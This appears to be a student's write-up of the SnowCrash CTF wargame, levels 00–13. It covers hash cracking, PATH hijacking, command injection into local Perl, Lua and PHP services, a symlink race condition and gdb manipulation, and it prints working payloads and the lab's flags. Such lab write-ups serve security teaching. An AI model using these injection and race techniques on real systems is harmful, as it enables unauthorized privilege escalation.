# level00

find / -user flag00 2>/dev/null
/usr/sbin/john readable by everyone
cat
cdiiddwpgswtgt -> nottoohardhere -> su flag00 -> getflag -> x24ti5gi3x0ol2eh4esiuxias

# level01
cat /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

42hDRfypTqqnw -> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -> abcdefg -> getflag -> f2av5il02puano7naaf6adaaf


# level02
ls
- level02.pcap
.pcap -> wireshark
follow TCP stream
```
Password: 
ft_wanNDReL0L
```
after cleaning dup lowercase letters:
ft_waNDReL0L
getflag -> kooda2puivaav1idi4f57q8iq

# level03
Reverse the file with the ghydra and see 

```
; Attributes: bp-based frame fuzzy-sp

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

; __unwind {
push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 20h
call    _getegid
mov     [esp+18h], eax
call    _geteuid
mov     [esp+1Ch], eax
mov     eax, [esp+18h]
mov     [esp+8], eax
mov     eax, [esp+18h]
mov     [esp+4], eax
mov     eax, [esp+18h]
mov     [esp], eax
call    _setresgid
mov     eax, [esp+1Ch]
mov     [esp+8], eax
mov     eax, [esp+1Ch]
mov     [esp+4], eax
mov     eax, [esp+1Ch]
mov     [esp], eax
call    _setresuid
mov     dword ptr [esp], offset command ; "/usr/bin/env echo Exploit me"
call    _system
leave
retn
; } // starts at 80484A4
main endp

```

So here echo is not secure because echo and not /bin/echo
so unset PATH
export PATH=/tmp

echo 'bin/sh' > /tmp/echo

and ./level03 create a new sh with the groups and id flag03
so just getflagls /tm

/bin/getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

# level04
the is a perl file :
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Here before i see that in ss -ltunp there is something host on 4747 surely this so this is the code behind
so is see that there is a param named x and an echo so im going to construct an url to start

level04@SnowCrash:~$ curl "http://localhost:4747/?x=hhelo"
hhelo

level04@SnowCrash:~$ curl "http://localhost:4747/?x=hhelo;/bin/ls"
hhelo

level04@SnowCrash:~$ curl "http://localhost:4747/?x=hhelo%3Bgetflag"
this not work so im encoding the URL
hhelo
getflat -> token : ne2searoevaevoem4ov4ar8ap


# level05
Upon logging in, the message "You have new mail" is displayed. This is the first clue.

So we use the command find to search all of the mail "find / -name mail 2>/dev/null"
Investigating the mail directories, specifically `/var/mail/level05`, reveals the root of the issue:

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

We discover that a cron job is executing the `/usr/sbin/openarenaserver` script every two minutes with the privileges of the `flag05` user.

The next step is to analyze this script:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The vulnerability is clear: the script executes (`bash -x`) any file placed in the `/opt/openarenaserver/` directory, and then immediately deletes it (`rm -f`).

The plan is to create a script in this directory. However, a simple `getflag` command won't work because the output will be lost and the script deleted before we can read it. This is a classic "race condition".

The solution is to have our script write the output of `getflag` to a file in a world-writable directory, such as `/tmp`.

Creating the exploit script:

```bash
# We create a file in the watched directory
level05@SnowCrash:~$ cat > /opt/openarenaserver/exploit.sh
# Inside, we put the command to execute getflag and redirect its output
getflag > /tmp/flag05_output
# Then save the file with CTRL+D
```

After waiting for the cron job to run (less than 2 minutes), the `exploit.sh` file disappears and the result file is created. All that's left is to read the result:

```bash
level05@SnowCrash:~$ cat /tmp/flag05_output
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

# level06

```bash
level06@SnowCrash:~$ ls -la
total 24
...
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
...
```
The `ls -la` output provides the most critical clue: the `level06` binary has the SUID bit set (`rws`) and is owned by `flag06`. This means any action performed by this binary will be done with the privileges of `flag06`. The binary is our entry point.

Running the binary with no arguments gives a PHP error, indicating it expects a filename. Running `strings` on the binary confirms it is a simple wrapper that executes `/usr/bin/php` on the `/home/user/level06/level06.php` script.

The real logic is therefore in the PHP script, which we can read:
```bash
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

**PHP Code Analysis and Vulnerability**

The core of the script is in the `x` function, specifically this line:
`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`

Let's break this down:
1.  `$a = file_get_contents($y);`: The script reads the entire content of the file provided as the first command-line argument (`$argv[1]`).
2.  `preg_replace(...)`: This function performs a search-and-replace using a regular expression.
3.  **The Pattern:** `/(\[x (.*)\])/` searches for a literal string that looks like `[x some_content]`. The `(.*)` part captures whatever is inside.
4.  **The Replacement:** `"y(\"\\2\")"` is what the matched string is replaced with. The `\\2` refers to the content captured by `(.*)`.
5.  **The Vulnerability - The `/e` Modifier:** This is the critical flaw. The `/e` (evaluate) modifier is a deprecated and highly dangerous feature. It tells `preg_replace` **not** to treat the replacement string as plain text, but to **execute it as PHP code**.

This means we can craft a file containing the string `[x our_code]` and the `preg_replace` function will execute `y("our_code")` as a PHP command.

**Crafting the Payload**

Our goal is to execute the `getflag` command. In PHP, we can execute system commands using backticks (`` ` ``) or functions like `system()`.

We need to create a file that contains our malicious string. If we write a file with `[x getflag]`, the script will try to execute `y("getflag")`, which doesn't help.

We need PHP to first execute our command, and then use its output. We can achieve this with PHP's complex syntax for strings: `${...}`. This forces the evaluation of the code inside the braces.

The final payload should be:
`${`getflag`}`

This tells PHP: "Execute the command `getflag` inside the backticks, then use the resulting string." The full string to put in our file is `[x ${`getflag`}]`.

**Execution**

1.  First, we create our payload file in a writable directory like `/tmp`.
    ```bash
    level06@SnowCrash:~$ cat > /tmp/payload
    [x ${`getflag`}]
    ```
    (Press CTRL+D to save)

2.  Then, we execute the SUID binary, passing our payload file as the first argument. The second argument can be anything, as it's not used in the vulnerable part of the code.
    ```bash
    level06@SnowCrash:~$ ./level06 /tmp/payload dummy
    ```

3.  The script reads `/tmp/payload`, finds the pattern `[x ${`getflag`}]`, and because of the `/e` modifier, it executes the replacement string. The `getflag` command runs with the privileges of `flag06`, and its output is printed to the screen, even though it's wrapped in a PHP notice.

**Result**
```
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

# level07
In the reverse we see a "LOGNAME" and after a getenv and after that an echo in a system with the "LOGNAME"
So we just 
export LOGNAME="cacatest;getflag"

and 
./level07
    cacatest
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

# level08
We see a file and a token file level08 et token

we dissaemble level08 and we see that it don't cat is the file name is token So we make a 
pwd
    /home/user/level08
and 
ln /home/user/level08/token /tmp/test -s


and to finish a 
./level08 /tmp/test
    quif5eloekouj29ke0vouxean

and for finish we 
su flag08
    quif5eloekouj29ke0vouxean

Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
# level09
we have a level09 file and a token file taht seem crypted so we try to  understand the level09 and :
./level09 aaaaaaa
    abcdefg

./level09 abcdef
    acegik

It seem that the position is added to the char so
a + 0
a + 1
a + 2 
ect... 
so we do 

```
with open('token', 'rb') as f:  # 'rb' pour lire en binaire
    data = f.read()
    str = data.decode('latin-1').strip()

i = 0
while(i < len(str)):
    print(chr(ord(str[i]) - i), end='')
    i += 1
```
and we have f3iji1ju5yuevaus41q1afiuq
so
su flag09
    f3iji1ju5yuevaus41q1afiuq
    
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z




# level10
./level10 sends [file] to [host]:6969
we can set a host easily with nc
`nc -l 6969`

great but
You don't have access to 'token'

tracing library calls, we find that 
`access(path, R_OK)`checks read permission (with calling process UID) (`level10`). 
connection to `host:6969`.
`open(path, O_RDONLY)` opens the file (with  effective UID, so `flag10` from SUID)

so the idea is to switch a ln fast between 2 files, one that we can open, and the flag, so that the check happens on our fake, and the open on the flag
so

loop 1 (alternate):
```
while true; do  
    ln -sf /tmp/faketoken /tmp/redir
    ln -sf /home/user/level10/token /tmp/redir 
done
```

loop2 (nc):
```
while true; do     nc -l 6969; done
```

loop3 (call ./level10 again and again)
```
while true; do     /home/user/level10/level10 /var/crash/fake 127.0.0.1; done
```

and we get `woupa2yuojeeaaed06riuj63c` -> su flag10 -> getflag -> feulo4b72j7edeahuete3no7c

# level11
lua flag waiting for a password
`prog = io.popen("echo "..pass.." | sha1sum", "r")`

so we see that the command is not protected so we can easily retrieve the flag by sending the correct password.

we do

nc 127.0.0.1 5151
    password: caca;getflag > /tmp/test

level11@SnowCrash:~$ cat /tmp/test
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s


# level12
The service is a Perl script on `localhost:4646`. Analyzing `level12.pl` is the first step.

The vulnerability is a command injection within the `t` function:
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
The user-controlled parameter `x` (stored in `$xx`) is directly placed into a command executed via backticks. However, there are two important sanitization steps that prevent simple injection:
1.  `$xx =~ tr/a-z/A-Z/`: The input from `x` is converted to uppercase.
2.  `$xx =~ s/\s.*//`: Any space and all characters that follow are removed from the input. This breaks payloads like `A;getflag`.

The solution is a two-part exploit that bypasses these constraints.

**Step 1: Create an exploit script**
A simple shell script containing the command to execute is created in a world-writable directory. Its name must be in uppercase to survive the `tr` command.

```bash
level12@SnowCrash:~$ cat > /tmp/EXPLOIT
getflag > /tmp/sale
# Press CTRL+D
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

**Step 2: Craft the injection payload**
We need to force the shell to execute our script. This is done by using nested backticks and shell globbing. The payload is passed as the `x` parameter.

-   Payload: `` `/*/EXPLOIT` ``
-   Why it works:
    -   It contains no lowercase letters and no spaces, so it passes the sanitization checks.
    -   When placed in the `egrep` command, it becomes ``egrep "^`/*/EXPLOIT`" /tmp/xd``.
    -   The shell executes the inner backticks first.
    -   `/*/EXPLOIT` expands to `/tmp/EXPLOIT`.
    -   The command `/tmp/EXPLOIT` is executed with the script's privileges (`flag12`), running `getflag` and saving the output to `/tmp/sale`.

**Execution and Result**

The final command is sent via `curl`:
```bash
level12@SnowCrash:~$ curl "http://127.0.0.1:4646/?x=\`/*/EXPLOIT\`"
..
```
The server responds with `..`, but the exploit has already run in the background. We can now read the flag from our output file:

```bash
level12@SnowCrash:~$ cat /tmp/sale
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

# level13
gdb ./level13

disas main
// on voit qu'il y a un getUID et en gros le code fait SI UID = 4242 on donne le token donc on va essayer de step juste apres getUID et changer sont retour pour du coup avoir le token
b getuid
run
step // pour aller juste apres getuid
// et du coup la on est sur juste avant un cmp avec UID parfait donc on check l'uid avec print qui doit etre dans la valeur de retour donc eax
print $eax
21XX
// donc la on a juste a le changer
set $eax=4242
step

// et la on a le token 
Single stepping until exit from function main,
which has no line number information.
your token is 2A31L79asukciNyi8uppkEuSx
0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
# level14


# tools
-john
-rockyou wordlist
-firefox (decypher)
-wireshark
-ghidra
-gdb
